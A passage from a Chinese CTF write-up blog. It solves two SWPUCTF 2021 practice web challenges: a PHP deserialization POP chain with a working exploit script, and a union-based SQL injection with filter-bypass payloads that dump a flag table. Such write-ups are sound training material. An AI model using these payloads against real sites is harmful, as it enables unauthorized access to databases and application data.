id="swpuctf-2021-新生赛pop"><a class="anchor" href="#swpuctf-2021-新生赛pop">#</a> [SWPUCTF 2021 新生赛] pop</h3><blockquote><p>pop 链，反序列化，php, 代码审计</p></blockquote><p>进入题目，是一个人 php 代码审计：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">w44m</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">protected</span> <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'123456'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'w44m'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">passwd</span> <span class="token operator">===</span><span class="token string single-quoted-string">'08067'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">passwd</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'nono'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">w22m</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$w00m</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">w00m</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">w33m</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$w00m</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$w22m</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">w00m</span><span class="token operator">-></span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">w22m</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token variable">$w00m</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'w00m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$w00m</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>审计代码后，得知反序列化参数为 &quot;w00m&quot;，</p><h5 id="查找入口"><a class="anchor" href="#查找入口">#</a> 查找入口</h5><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 传参 $w00m, 直接反序列化，入口就在__destruct，或者_wakeup，这里的 w22m 符合条件</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">w22m</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$w00m</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">w00m</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h5 id="找链子"><a class="anchor" href="#找链子">#</a> 找链子</h5><figure class="highlight scss"><figcaption data-lang="Sass (Scss)"></figcaption><table><tr><td data-num="1"></td><td><pre># echo一个对象，调用__toString方法，然后调用内部w00m的方法，由此可得链子如下</pre></td></tr><tr><td data-num="2"></td><td><pre># w22m.__<span class="token function">destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.w00m->w33m.__<span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.w00m->w44m.<span class="token function">Getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h5 id="写exp"><a class="anchor" href="#写exp">#</a> 写 exp</h5><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">w44m</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'w44m'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">protected</span> <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'08067'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">w22m</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$w00m</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">w33m</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$w00m</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$w22m</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">w22m</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">w44m</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">w33m</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token variable">$a</span> <span class="token operator">-></span> <span class="token property">w00m</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token variable">$c</span> <span class="token operator">-></span> <span class="token property">w00m</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token variable">$c</span> <span class="token operator">-></span> <span class="token property">w22m</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Getflag'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>这里如果不想要在脚本中 url 编码，由于不可见字符的影响，在网站修改数据时注意把私有、保护型的变量中的值 %20 改为 %00。</p><h3 id="swpuctf-2021-新生赛sql"><a class="anchor" href="#swpuctf-2021-新生赛sql">#</a> [SWPUCTF 2021 新生赛] sql</h3><blockquote><p>空格绕过，等号绕过，SQL 注入</p></blockquote><p>进入后发现它求我们输点东西，发现网页标题似乎有参数，打开控制台看到参数是 wllm。</p><p>尝试</p><blockquote><p>?wllm=1</p></blockquote><p>回显出</p><blockquote><p>Your Login name:xxx<br>Your Password:yyy</p></blockquote><p>再尝试</p><blockquote><p>?wllm=1'%23</p></blockquote><p>发现并没有报错，说明是单引号闭合。</p><p>看看有几列：</p><blockquote><p>?wllm=1' order by 4%23</p></blockquote><p>回显出 &quot;请勿非法操作&quot;，说明有东西被过滤了，经过测试发现是空格被过滤了，直接用 hackbar 自带的绕过空格尝试绕过：</p><blockquote><p>?wllm=1'/**/order/**/by/**/4%23</p></blockquote><p>得到回显：</p><blockquote><p>Unknown column '4' in 'order clause'</p></blockquote><p>再尝试 3 列，发现成功。</p><p>测试回显在哪两列显示：</p><blockquote><p>?wllm=0'/**/union/**/select/**/1,2,3%23</p></blockquote><p>回显：</p><blockquote><p>Your Login name:2<br>Your Password:3</p></blockquote><p>查看所有表：</p><blockquote><p>?wllm=0'union/**/select/**/1,2,group_concat(schema_name)/**/from/**/information_schema.schemata%23</p></blockquote><p>回显：</p><blockquote><p>Your Login name:2<br>Your Password:information_schema,m</p></blockquote><p>发现没显示全，用函数截取以下发现 substr,right,left 全部都被过滤了，只有 mid 能用。</p><p>这里就不截取了。</p><p>查表：</p><blockquote><p>?wllm=0'union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()</p></blockquote><p>发现又有东西被过滤了，经过测试发现是 &quot;=&quot; 号，用 like 代替。</p><blockquote><p>?wllm=0'union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()%23</p></blockquote><p>得知一个表：LTLT_flag，不出意外 flag 应该就在里面。</p><p>查询库中所有的字段：</p><blockquote><p>?wllm=0'union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()%23</p></blockquote><p>知道了一个叫 flag 的字段。</p><p>直接查询，再配合 mid 即可。</p><blockquote><p>?wllm=0'/**/union/**/select/**/1,2,flag/**/from/**/LTLT_flag</p></blockquote><blockquote><p>?wllm=0'/**/union/**/select/**/1,2,mid(flag,start,end)/**/from/**/LTLT_flag</p></blockquote><div class="tags"><a href="/tags/%E6%87%82%E4%B8%8D%E6%87%82python%E7%9A%84%E5%90%AB%E9%87%91%E9%87%8F%E5%95%8A/" rel="tag"><i class="ic i-tag"></i> 懂不懂python的含金量啊</a> <a href="/tags/%E5%8F%88%E5%9D%90%E7%89%A2%E4%BA%86/" rel="tag"><i class="ic i-tag"></i> 又坐牢了</a> <a href="/tags/%E6%88%91%E5%B0%B1%E6%98%AF%E6%AD%AA%E8%84%96/" rel="tag"><i class="ic i-tag"></i> 我就是歪脖</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A5%BD%E9%9A%BE/" rel="tag"><i class="ic i-tag"></i> 反序列化好难</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2023-09-12 20:20:37" itemprop="dateModified" datetime="2023-09-12T20:20:37+08:00">2023-09-12</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="p1kap1 微信支付"><p>微信支付</p></div><div><img data-src="/images/alipay.png" alt="p1kap1 支付宝"><p>支付宝</p></div><div><img data-src="/images/paypal.png" alt="p1kap1 贝宝"><p>贝宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>p1kap1 <i class="ic i-at"><em>@</em></i>P1kap1</li><li class="link"><strong>本文链接：</strong> <a href="http://yoursite.com/CTF/web/NSS%E9%A2%98%E8%AE%B0-web%E7%AF%87/" title="NSS题记-web篇">http://yoursite.com/CTF/web/NSS题记-web篇/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/CTF/misc/NepCTF-misc/" itemprop="url" rel="prev" data-background-image="&#x2F;covers&#x2F;be5.jpg" title="NepCTF2023复现-Misc"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 高贵的Misc</span><h3>NepCTF2023复现-Misc</h3></a></div><div class="item right"><a href="/CTF/web/NSSCTF-2nd-web/" itemprop="url" rel="next" data-background-image="&#x2F;covers&#x2F;9.jpg" title="NSSCTF-2nd-web"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 无敌的Web</span><h3>NSSCTF-2nd-web</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bez_unserialize"><span class="toc-number">1.</span> <span class="toc-text">[SWPUCTF 2021 新生赛] ez_unserialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload20"><span class="toc-number">2.</span> <span class="toc-text">[SWPUCTF 2021 新生赛] easyupload2.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload10"><span class="toc-number">3.</span> <span class="toc-text">[SWPUCTF 2021 新生赛] easyupload1.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bno_wakeup"><span class="toc-number">4.</span> <span class="toc-text">[SWPUCTF 2021 新生赛] no_wakeup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bpseudoprotocols"><span class="toc-number">5.</span> <span class="toc-text">[SWPUCTF 2021 新生赛] PseudoProtocols</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nisactf-2022easyssrf"><span class="toc-number">6.</span> <span class="toc-text">[NISACTF 2022]easyssrf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bjdctf-2020easy_md5"><span class="toc-number">7.</span> <span class="toc-text">[BJDCTF 2020]easy_md5</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#md5-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">7.0.1.</span> <span class="toc-text">MD5-SQL 注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84md5%E5%8A%A0%E5%AF%86%E5%90%8E%E4%BB%A50e%E5%BC%80%E5%A4%B4%E7%9A%84%E6%9C%89"><span class="toc-number">7.0.2.</span> <span class="toc-text">常用的 MD5 加密后以 0E 开头的有</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">7.0.3.</span> <span class="toc-text">数组绕过</span></a></li></ol></li></ol><li class="toc-item toc-level-3"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload30"><span class="toc-number">8.</span> <span class="toc-text">[SWPUCTF 2021 新生赛] easyupload3.0</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#htaccess%E6%96%87%E4%BB%B6"><span class="toc-number">8.0.1.</span> <span class="toc-text">.htaccess 文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#httpconf%E6%96%87%E4%BB%B6%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-number">8.0.2.</span> <span class="toc-text">http.conf 文件 (前提条件)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Berror"><span class="toc-number">9.</span> <span class="toc-text">[SWPUCTF 2021 新生赛] error</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bhardrce"><span class="toc-number">10.</span> <span class="toc-text">[SWPUCTF 2021 新生赛] hardrce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bpop"><span class="toc-number">11.</span> <span class="toc-text">[SWPUCTF 2021 新生赛] pop</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%85%A5%E5%8F%A3"><span class="toc-number">11.0.1.</span> <span class="toc-text">查找入口</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%BE%E9%93%BE%E5%AD%90"><span class="toc-number">11.0.2.</span> <span class="toc-text">找链子</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%99exp"><span class="toc-number">11.0.3.</span> <span class="toc-text">写 exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bsql"><span class="toc-number">12.</span> <span class="toc-text">[SWPUCTF 2021 新生赛] sql</span></a></li></div><div class="related panel pjax" data-title="系列文章"><ul><li class="active"><a href="/CTF/web/NSS%E9%A2%98%E8%AE%B0-web%E7%AF%87/" rel="bookmark" title="NSS题记-web篇">NSS题记-web篇</a></li><li><a href="/CTF/web/NSSCTF-2nd-web/" rel="bookmark" title="NSSCTF-2nd-web">NSSCTF-2nd-web</a></li><li><a href="/CTF/web/SICTF2023-Round2/" rel="bookmark" title="SICTF2023-Round2">SICTF2023-Round2</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="p1kap1" data-src="/images/avatar.jpg"><p class="name" itemprop="name">p1kap1</p><div class="description" itemprop="description">明镜止水之心</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">6</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">4</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">7</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Axa2FwMQ==" title="https:&#x2F;&#x2F;github.com&#x2F;p1kap1"><i class="ic i-github"></i></span> <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPTE5MDA5MTg3MjE=" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;1900918721"><i class="ic i-cloud-music"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/CTF/misc/NepCTF-misc/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/CTF/web/NSSCTF-2nd-web/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 我想打CTF">我想打CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/web/" title="分类于 无敌的Web">无敌的Web</a></div><span><a href="/CTF/web/SICTF2023-Round2/" title="SICTF2023-Round2">SICTF2023-Round2</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/knowledge/" title="分类于 我知道你会为我停留🎶">我知道你会为我停留🎶</a></div><span><a href="/knowledge/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%A5%87%E6%80%9D%E5%A6%99%E6%83%B3/" title="php反序列化的奇思妙想no.1">php反序列化的奇思妙想no.1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 我想打CTF">我想打CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/web/" title="分类于 无敌的Web">无敌的Web</a></div><span><a href="/CTF/web/NSS%E9%A2%98%E8%AE%B0-web%E7%AF%87/" title="NSS题记-web篇">NSS题记-web篇</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 我想打CTF">我想打CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/misc/" title="分类于 高贵的Misc">高贵的Misc</a></div><span><a href="/CTF/misc/NepCTF-misc/" title="NepCTF2023复现-Misc">NepCTF2023复现-Misc</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/knowledge/" title="分类于 我知道你会为我停留🎶">我知道你会为我停留🎶</a></div><span><a href="/knowledge/%E8%AE%B0%E4%B8%80%E6%AC%A1flask%E7%9A%84%E9%99%A8%E8%90%BD/" title="flask伪造+pickle模块序列化">flask伪造+pickle模块序列化</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 我想打CTF">我想打CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/web/" title="分类于 无敌的Web">无敌的Web</a></div><span><a href="/CTF/web/NSSCTF-2nd-web/" title="NSSCTF-2nd-web">NSSCTF-2nd-web</a></span></li></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">p1kap1 @ Clear Mind</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">71k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">1:05</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"CTF/web/NSS题记-web篇/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,audio:["https://music.163.com/#/song?id=5103234"],fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html>